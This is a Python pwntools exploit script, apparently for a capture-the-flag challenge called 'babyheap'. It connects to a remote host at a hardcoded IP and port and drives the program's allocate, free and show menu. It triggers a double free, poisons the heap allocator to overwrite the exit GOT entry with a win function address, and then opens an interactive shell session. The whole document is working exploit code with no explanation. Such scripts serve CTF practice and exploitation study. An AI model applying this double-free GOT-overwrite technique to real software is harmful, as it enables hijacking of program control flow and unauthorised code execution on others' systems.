from pwn import *
# this challenge needs a libc version which enables double free
# s = gdb.debug('./babyheap')
s = remote('34.118.43.143', 3009)
exit_got = p64(0x404058)
puts_got = p64(0x404020)
win = p64(0x00000000004011f1)
def alloc(index,size,content):
    s.recvuntil(':')
    s.sendline('1')
    s.recvuntil(':')
    s.sendline(str(index))
    s.recvuntil(':')
    s.sendline(str(size))
    s.recvuntil('content:')
    s.sendline(content)

def show(index):
    s.recvuntil(':')
    s.sendline('4')
    s.recvuntil(':')
    s.sendline(str(index))

def free(index):
    s.recvuntil(':')
    s.sendline('2')
    s.recvuntil(':')
    s.sendline(str(index))

alloc(0, 0x10, 'AAAAAAAA')
log.info("Allocated first chunk")
alloc(1, 0x10, 'BBBBBBBB')
log.info("Allocated second chunk")
free(0)
free(0)
log.info("Double free!")
alloc(2, 0x10, exit_got)
log.info("exit GOT")
alloc(3, 0x10, 'CCCCCCCC')
alloc(4, 0x10, win)
log.info("win function")
s.interactive()
